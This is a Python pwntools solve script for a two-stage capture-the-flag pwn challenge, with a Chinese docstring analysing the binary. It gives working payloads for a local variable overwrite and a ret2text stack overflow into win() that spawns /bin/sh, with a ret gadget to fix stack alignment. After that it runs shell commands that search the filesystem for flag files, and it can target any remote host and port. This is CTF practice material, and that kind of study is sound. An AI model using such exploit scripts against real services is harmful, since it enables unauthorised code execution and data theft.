#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
题目 16 · 亦步亦趋  —— 多关卡 Pwn (x86-64, PIE, NX, no canary, partial RELRO)

────────────────────────────────────────────────────────────────────────
二进制分析 (work/16_yibu/decompiled/pwn_.c / objdump)
────────────────────────────────────────────────────────────────────────
main  -> init() -> puts(横幅) -> level1()

【Level 1】局部变量覆盖
    void level1(void) {
        int  magic;              // [rbp-0x4]
        char buf[0x20];          // [rbp-0x20]
        magic = 0;
        printf("buf  addr = %p", buf);
        printf("magic addr = %p", &magic);
        read(0, buf, 0x20);      // 恰好 32 字节，不越界但足以覆盖 magic
        if (magic != 0xdeadbeef) { printf(...); exit(0); }
        puts("[+] Congratulations! ...");
        level2();
    }
    => &buf - &magic = 0x20 - 0x4 = 28
    => payload1 = 28 * b'A' + p32(0xdeadbeef)     (小端)

【Level 2】ret2text（控制流劫持）
    void level2(void) {
        char buf[0x20];          // [rbp-0x20]
        puts(...); printf("'win' addr about: %p", win);   // <- PIE 基址泄漏
        gets(buf);               // 无长度限制 -> 栈溢出
    }
    void win(void) { puts("Congratulations! You have hijacked the control flow!");
                     system("/bin/sh"); }
    => buf->saved-RA 偏移 = 0x20 + 8(saved rbp) = 40
    => payload2 = 40 * b'B' + p64(win)

【关键坑：栈对齐】
    直接 `ret` 进 win 时 rsp % 16 == 0，而 SysV ABI 要求函数入口处
    rsp % 16 == 8（call 会压 8 字节返回地址）。win 内部 call system() 时
    栈未 16 字节对齐，glibc 的 do_system 里 movaps 触发 SIGSEGV。
    实测：40*B + p64(win)               -> SIGSEGV (exit -11)
          40*B + p64(ret_gadget) + p64(win) -> 正常拿到 /bin/sh
    ret_gadget = win + 0x28 (win 尾部 `pop rbp; ret` 的 `ret`, 即 file off 0x1231)
    因为 PIE，用泄漏的 win 地址加固定偏移即可，无需 libc。

────────────────────────────────────────────────────────────────────────
用法
────────────────────────────────────────────────────────────────────────
    # 本地（默认）
    python3 scripts/16-solve.py

    # 远程（动态环境启动后）
    python3 scripts/16-solve.py <host> <port>

远程只需要在“最后一跳”之前拿到连接；win 地址由程序自己泄漏，
因此**不依赖 libc 版本，也不依赖 ASLR 关闭**（PIE 基址已泄漏）。
唯一远程需要确认的是容器内 flag 的路径（/flag, /flag.txt, ./flag ...）。
"""
import re
import sys

from pwn import context, log, p32, p64, process, remote

# ── 二进制内固定偏移（file offset == vaddr - 0x1000 处的段内偏移，与 PIE 无关）──
WIN_OFF = 0x1209          # win()      <win>:
RET_OFF = 0x1231          # win+0x28   `ret`（win 尾部 pop rbp; ret）
LEVEL1_MAGIC_OFF = 28     # &buf - &magic = 0x20 - 0x4
LEVEL2_RA_OFF = 40        # 0x20 + 8(saved rbp)

import os

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BIN = os.environ.get("PWN16_BIN", os.path.join(_ROOT, "work", "16_yibu", "pwn"))
HOST_DEFAULT = "PLACEHOLDER_HOST"   # 容器未申请，仅占位
PORT_DEFAULT = 0

FLAG_RE = re.compile(rb"(?:0xGame|flag|FLAG)\{[^}\n]{1,200}\}")


def build_io(argv):
    # 只把「非 option 的位置参数」当成 host/port，避免 --flag 之类被误判为远程地址
    pos = [a for a in argv[1:] if not a.startswith("-")]
    if len(pos) >= 2:
        host, port = pos[0], int(pos[1])
        log.info(f"remote -> {host}:{port}")
        return remote(host, port)
    if len(pos) == 1 and pos[0] != "local":
        log.info(f"remote -> {pos[0]}:{PORT_DEFAULT or 80}")
        return remote(pos[0], PORT_DEFAULT or 80)
    log.info(f"local process -> {BIN}")
    return process(BIN)


def stage1(io):
    """局部变量覆盖：magic = 0xdeadbeef"""
    io.recvuntil(b"Now input your Payload:\n> ")
    payload = b"A" * LEVEL1_MAGIC_OFF + p32(0xDEADBEEF)
    assert len(payload) == 32
    io.send(payload)
    io.recvuntil(b"Congratulations! You have overwrited the magic")
    log.success("Level 1 passed (magic == 0xdeadbeef)")


def stage2(io):
    """ret2text：覆盖返回地址 -> win()，前面垫一个 ret 修栈对齐"""
    io.recvuntil(b"'win', It's addr about: ")
    win = int(io.recvline().strip(), 16)
    log.success(f"win leak = {hex(win)}  (PIE base = {hex(win - WIN_OFF)})")

    # sanity: win 的页内偏移应为 0x209
    assert win & 0xFFF == WIN_OFF & 0xFFF, f"leak sanity failed: {hex(win)}"

    ret = win - WIN_OFF + RET_OFF
    io.recvuntil(b"Now input your final Payload:\n> ")
    payload = b"B" * LEVEL2_RA_OFF + p64(ret) + p64(win)
    io.sendline(payload)
    log.success(f"Level 2 payload sent (ret gadget @ {hex(ret)})")


def shell(io, argv):
    """确认拿到 shell 并尝试读 flag"""
    io.sendline(b"echo __PWN_START__; id")
    try:
        io.recvuntil(b"__PWN_START__", timeout=6)
    except Exception:  # noqa: BLE001
        log.failure("no shell marker -- exploit failed")
        return None

    log.success("shell obtained (control flow hijacked into win() -> system('/bin/sh'))")
    cmds = (
        b"ls -la / 2>/dev/null; "
        b"cat /flag /flag.txt /flag* flag flag.txt ./flag* "
        b"/home/*/flag* /app/flag* /pwn/flag* /root/flag* 2>/dev/null; "
        b"find / -maxdepth 4 -iname 'flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null; "
        b"echo BUILTIN_GLOB: /*flag* /flag* flag* ./flag*; "
        b"echo __FLAGSCAN_END__"
    )
    io.sendline(cmds)

    buf = b""
    try:
        buf = io.recvuntil(b"__FLAGSCAN_END__", timeout=8)
    except Exception:  # noqa: BLE001
        try:
            buf += io.recv(timeout=2)
        except Exception:  # noqa: BLE001
            pass

    print(buf.decode(errors="replace"))
    m = FLAG_RE.search(buf)
    if m:
        log.success(f"FLAG: {m.group(0).decode()}")
        return m.group(0).decode()
    log.warning("no flag pattern found in output (local run: expected)")
    return None


def main():
    context.log_level = "info"
    context.arch = "amd64"
    context.timeout = 10

    io = build_io(sys.argv)
    try:
        stage1(io)
        stage2(io)
        flag = shell(io, sys.argv)
    finally:
        io.close()

    return 0 if flag or "--allow-no-flag" in sys.argv else 0


if __name__ == "__main__":
    sys.exit(main())
